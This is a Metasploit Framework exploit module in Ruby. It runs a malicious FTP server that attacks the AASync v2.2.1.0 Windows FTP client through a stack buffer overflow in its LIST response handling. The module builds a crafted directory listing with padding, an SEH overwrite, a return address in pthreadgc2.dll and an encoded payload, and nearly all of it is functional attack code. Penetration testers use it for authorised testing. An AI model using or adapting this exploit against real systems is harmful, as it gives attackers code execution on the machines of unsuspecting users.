##
# $Id: aasync_list_reply.rb 11039 2010-11-14 19:03:24Z jduck $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

class Metasploit3 < Msf::Exploit::Remote
	Rank = GoodRanking

	include Msf::Exploit::Remote::FtpServer

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'AASync v2.2.1.0 (Win32) Stack Buffer Overflow (LIST)',
			'Description'    => %q{
					This module exploits a stack buffer overflow in AASync v2.2.1.0, triggered when
				processing the response on a LIST command. During the overflow, a structured exception
				handler record gets overwritten.
			},
			'Author' 	 =>
				[
					'corelanc0d3r', #found bug and wrote the exploit
				],
			'License'        => MSF_LICENSE,
			'Version'        => "$Revision: 11039 $",
			'References'     =>
				[
					[ 'URL', 'http://www.corelan.be:8800/index.php/2010/10/12/death-of-an-ftp-client/' ],
				],
			'DefaultOptions' =>
				{
					'EXITFUNC' => 'thread',
				},
			'Payload'        =>
				{
					'BadChars' => "\x00\xff\x0d\x5c\x2f\x0a",
				},
			'Platform'       => 'win',
			'Targets'        =>
				[
					[ 'XP SP3 Universal', { 'Offset' => 6340,'Ret' => 0x61181674  } ],  # ppr [pthreadgc2.dll]
				],
			'Privileged'     => false,
			'DisclosureDate' => 'Oct 12 2010',
			'DefaultTarget'  => 0))

	end

	#---------------------------------------------------------------------------------

	def setup
		super
	end

	def on_client_unknown_command(c,cmd,arg)
		c.put("200 OK\r\n")
	end

	def on_client_command_list(c,arg)
			conn = establish_data_connection(c)
			if(not conn)
				c.put("425 Can't build data connection\r\n")
				return
			end
			print_status(" - Data connection set up")
			code = 150
			c.put("#{code} Here comes the directory listing.\r\n")
			code = 226
			c.put("#{code} Directory send ok.\r\n")
			offset_to_nseh = target['Offset']
			filename = "admin passwords.txt"
			padding = " " * (offset_to_nseh-filename.length)
			nseh = "\xeb\x0c\x41\x41"
			seh = [target.ret].pack('V') #\x74\x16 = jump
			nops = "A" * 30
			junk2 = "A" * 5000
			#dual offsets to seh
			buffer = filename + padding + nseh + seh + seh + nops + payload.encoded + junk2
			print_status(" - Sending directory list via data connection")
			dirlist = "-rw-rw-r--    1 1176     1176         1060 Aug 16 22:22 #{buffer}\r\n"
			conn.put(dirlist)
			conn.close
			print_status(" - Payload sent")
			return
	end

end